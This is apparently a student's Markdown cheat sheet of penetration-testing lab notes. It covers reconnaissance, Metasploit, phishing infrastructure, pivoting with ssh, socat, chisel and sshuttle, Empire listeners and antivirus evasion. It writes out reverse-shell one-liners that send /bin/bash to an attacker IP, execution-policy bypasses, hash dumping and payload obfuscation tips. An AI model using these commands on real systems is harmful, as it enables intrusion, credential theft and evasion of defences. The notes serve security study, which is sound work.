- [Network Assesment](#network-assesment)
- [Basic Steps](#basic-steps)
  - [active](#active)
  - [Metasploit with database](#metasploit-with-database)
    - [NMAP - DB_NMAP](#nmap---db_nmap)
  - [External Tools](#external-tools)
  - [Meterpreter (payload)](#meterpreter-payload)
  - [Phishing](#phishing)
- [Passive](#passive)
  - [recon-ng](#recon-ng)
  - [Weaponization](#weaponization)
- [PIVOTING](#pivoting)
  - [SSH](#ssh)
  - [PLINK.EXE](#plinkexe)
  - [SOCAT](#socat)
  - [CHISEL](#chisel)
  - [SSHUTTLE](#sshuttle)
  - [PROXY](#proxy)
  - [Empire (windows) / Starkiller](#empire-windows--starkiller)
  - [Hop Listener](#hop-listener)
- [Git Enumeration](#git-enumeration)
- [Antivirus Evasion](#antivirus-evasion)
  - [Cross compilation](#cross-compilation)
  - [How AV Works](#how-av-works)# Network Assesment

# Basic Steps
- Enumerate
- Find everything that there is outside and inside
  -  Number of machines
  - services running
  - Publici interface?
  - git server ?
  - public IP
- find services running, find cve for these services
- stablish stable connection (pivoting): reverse shell, proxy, ssh, port forwarding, socat, sshuttle
- get ssh key if they are available
- upload/download files
- No dns if web: add to etc/hosts

## active
- interacting
- https://www.rapid7.com/db/
- searchsploit

## Metasploit with database

1. service postgresql start
2. service metasploit start
3. update-rc.d postgresql enable *for performance*
4. update-rc.d metasploit enable *for performance*
5. db_rebuild_cache [in msf console] *for performance*

- db_command ==> db_status, db_nmap etc

- workspace -a (add)
- workspace -d (delete)
- workspace name (move to name)

### NMAP - DB_NMAP
- db_nmap 
  - --scrip *script_name*: most commom vulnerability scrips, CVEs will be shown
    - https://www.exploit-db.com/
    - https://nvd.nist.gov/vuln/full-listing
  - -sC: other common scripts
  - -sS (Syn), -sA(Ack)
  - -A: basic scan with OS include
    - -sV -O -sC [default scripts] --traceroute
  - -p-: all ports
  - -sV: version of services found
  - -Pn: no ping
  - -T[0-5] = Control speed
  - -S [Spoofed] -e [INTERFACE] -Pn [NO Ping] => we need to monitor the traffic
  - --spoof-mac [MAC]
  - -f[-f] => fragment
  - --reason / -v / -vv / -d / -dd

- Output
  - -oN = normal output
  - -oG = grep output

- hosts: list hosts from db
  - -a: add
  - -d: delete
  - -R: inside a exploit/scanner to add the scanned host as RHOST

- services: display services found in scans
 - From services google for vulnerabilities /also search in metasploit
 - Common services: http, ftp, smb, ssh, rdp

## External Tools
- enum4linux IP_
- metasploit (smb/enum || ssh/enum)
- gobuster / ffuf
- lienum (linux): 
  - the file must be executed in the target
  - search for readble important files
- executables (SUID): find / -perm -u=s -type f 2>/dev/null 
- How to abuse of each executable: https://gtfobins.github.io/gtfobins/vim/

- PowerSploit (windows)
  - in the target 

## Meterpreter (payload)
- hashdump (migrate to process first)
- getpid
- getpriv
- migrate PID [try and error, migrating to existing process] + check hashdump
- search

## Phishing
- Steps
  - register domain name
  - ssl/tsl certificated
  - email server/account
  - Dns records
  - web server

- GoPhish
  - manage phishing campaings

- Droppers
  - poison, downloaded file

# Passive
- whois
- nslookup -type=?? URL SERVER
- dig SERVER URL TYPE
- host
- Google Hacking Database
  - [intitle:"index of" "nginx.log"](https://www.exploit-db.com/google-hacking-database)
  - 
- Google
  - blabla site:
  - filetype:pdf  inurl:www.google.de
  - site:hs-worms.de filetype:docx
  - *intitle:index.of site:*
  - *intitle:login*
  - https://web.dev/measure/
  - robots.txt

- Maltego
  - graphical

- DNS:
  - shodan.io [check black friday - https://www.shodan.io/]
  - https://viewdns.info/
  - https://threatintelligenceplatform.com/

## recon-ng
- Workspace:
  - workspace create NAME
  - db schmea = check database
- marketplace search MODULE
  - info, install, remove MODULE
- Modules
  - module search/load  
  - options list/set/unset

## Weaponization
- Developing malicious code
- https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development
- VBE
- HTA - Html application
- windows reverse shell
  - get-executionpolicy = for ps1 files
  - set-executionpolicy -Scote Currentuser remotesigned
  - powershell -ex bypass -File name.ps1

# PIVOTING
-  from on machine to another
-  tunnelling/proxying: route all traffic (a lot of traffic)
-  port forwarding: create connection (few ports)
-  ProxyChain
- (linux) firewall-cmd --zone=public --add-port PORT/tcp
- (windows) netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT

## SSH
- Port Forwarding
  - ssh -L [myport]:target:[open_port_target] user@[public_ip] -fN
- Proxy
  - ssh -D PORT user@[public_ip] -fN
- create key pair on the attacking machine
- transfer private key to victim
- stablish connection from victim to attacking
  - ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
  - executing on we habe the shell

- -L ==> Port FOrwarding
  - ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
  - access FIRST through SECOND, 8000 is local port
    - -f = background
    - -N no command execution

- -D [PORT] ==> Proxy
  - open port on attacking
-Reverse Connections
  - generate ssh key
  - put .pub in authorized: command="echo 'This account can only be used for port forwarding'", no-agent-forwarding,no-x11-forwading,no-pty ssh-rsa key
  - restart ssh
  - transfer private key to target: 
  - port forward: ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
  - reverse proxy: ssh -R 1337[localport] USERNAME@ATTACKING_IP -i KEYFILE -fN


## PLINK.EXE
- command line for putty
- cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
- convert key with puttygen: puttygen key -o xxx.ppk

## SOCAT
- Reverse shell
  - listener on the attacker
  - relay on compromised: ./socat tcp-l:8000 tcp:Attacker-IP:443 &
  - create reverse shell from compromised to attacker: nc localhost 8000 -e/bin/bash

- Port Forwarding - Method 1
  - open port on victim + redirect to target server = ./socat tcp-l:[port_on_victim],fork,reuseaddr tcp:[target_ip]:3306 &

- Method 2 -Quieter - read more about that https://tryhackme.com/room/wreath: 
  - Attacker, opens to ports: socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
  - victim: ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
- on victim: ./socat tcp-l:8000 tcp:10.50.102.138:443 & => connect victim back to us on port 443
- on victim: ./nc 127.0.0.1 8000 -e /bin/bash ==> listen to port 8000 
- Port Forwarding [From_Compromised_to_TARGET]: ./socat tcp-l:[port_on_compromised],fork,reuseaddr tcp:[IP_Target]:3306 &

- Encrypted:
  - Create certificate: openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
  - merge keys: cat shell.key shell.crt > shell.pem
  - listener: socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
  - connect back: socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
 close all:
  - jobs ==> find socats processes 
  
## CHISEL
- set up tunnel proxy / port forward
  
- client / server 
  
- Reverse SOCKS Proxy
  - server: chisel server -p [port] --reverse &
  - client (victim0): ./chisel client [attacker]:8005 R:socks &
    - R = remote, client knows that server antecipate proxy
- 
- Forward SOCK Proxy
  - victim: ./chisel server -p LISTEN_PORT --socks5
  - attacker: ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
  
- Port Forward
  - attacker: ./chisel server -p LISTEN_PORT --reverse &
  - victim to target: ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
  - victim to our machine: ./chisel server -p 1337 --reverse &
  
- Local Port Forward
  - compromised: ./chisel server -p LISTEN_PORT
  - attacker: ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT

- In the machine with evil-win open firewall port
  - cd w
  - chisel client => attacking
  - chisel server => victim

## SSHUTTLE
- easier to handle
- only linzx
- need ssh access to public interface
- sshuttle -r username@address subnet  
  - -N to guess the subnet
- No password:
  - sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
  - -x exclude compromised server
- Direct access to evil-winrM
  - evil-winrm -u pacoca -p 123456 -i 10.200.101.150
-Reset resolved.service: sudo systemctl restart systemd-resolved.service
 
## PROXY
- proxychains
  - open port in our system linked to target
  - proxychains COMMAND [host] [port] / own conf file proxychains.conf
    - comment proxy_dns ==> cause nmap to crash
    - no Ping (-Pn) only TCP, no UDP/SYN
  
- FoxyProxy
  - better for web

## Empire (windows) / Starkiller
- powershell-empire server + client
  - different location:
    - /usr/share/powershell-empire/empire/client/config.yaml
    - connect HOSTNAME --username=USERNAME --password=PASSWORD
- Starkiller: app
  - user: empireadmin pass: password123
- Listener: listen connection
- Stargers: payloads for robust shell
- Agents: sessions (like metasploit)
- Modules (further agends)

- Start listener
  - uselistener [NAME]
  - set [OPTION_VALUE]
  - execute
  
- Stagers
  - usestager 
  - Place payload + execute it
  - interact NAME
  - help = display commandos
  
- Starkiller
  - GUI

## Hop Listener
- noo connection forwarding
- create files copied across compromised to target = reference back to our listener
- Every connection happens with the compromised who sends to the target

- listener [http_hop]
  - .php files that need to be sent to compromised
  - host: compromised
  - redirectlistener: existing listener that is running
  - port: the webserver will host the hop file in this port
- Create Stager: 
  - starger [multi/launcher]
    - set listener
- set files on jumpserver
  - transfer created files to compromised server
  - open port firewall
  - make sure we have the access to the target
  - use module to escalate privilege

# Git Enumeration
- nmap -sn ip.1-255 -oN output
- check error message in the http server
- explore folders
- find exploit
- dos2unix exploit.py OR sed -i 's/\r//' python.py
- correct the information on the exploit
- execute shell there
- execute with burp or curl
- curl -POST localhost:8000 ==> here we go to the computer we dont have access
  
- Extract .git folder
- Gittools
  - dumper: downlaod exposed .git directory from site
  - extractor: take local .git and recreate repository
  - finder: search for exposed g.t
  - Read files: 
    - separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"

# Antivirus Evasion
- Fundamentals
- 2 types
  - on-disk
    - execute on target
  - in memory
    - import into memory and execute. Not save in the disk
  
- Identify AV
  - Seatbelt
  - SharpEDRChecker
  - disable cloud-based protection: test our payload
  
- Obfuscate payload
  - encode string
  - split parts
  - https://www.gaijin.at/en/tools/php-obfuscator

## Cross compilation
- run programs in different platforms

## How AV Works
- Static
  - signature detection
  - byte matching: find matching sequences in the file
- Dynamic / Heuristic / Behavioural
  - line by line execution
  - pre-defined rules
  - no gan, no gui + VM = sandbox
- [Network Assesment](#network-assesment)
- [Basic Steps](#basic-steps)
  - [active](#active)
  - [Metasploit with database](#metasploit-with-database)
    - [NMAP - DB_NMAP](#nmap---db_nmap)
  - [External Tools](#external-tools)
  - [Meterpreter (payload)](#meterpreter-payload)
  - [Phishing](#phishing)
- [Passive](#passive)
  - [recon-ng](#recon-ng)
  - [Weaponization](#weaponization)
- [PIVOTING](#pivoting)
  - [SSH](#ssh)
  - [PLINK.EXE](#plinkexe)
  - [SOCAT](#socat)
  - [CHISEL](#chisel)
  - [SSHUTTLE](#sshuttle)
  - [PROXY](#proxy)
  - [Empire (windows) / Starkiller](#empire-windows--starkiller)
  - [Hop Listener](#hop-listener)
- [Git Enumeration](#git-enumeration)
- [Antivirus Evasion](#antivirus-evasion)
  - [Cross compilation](#cross-compilation)
  - [How AV Works](#how-av-works)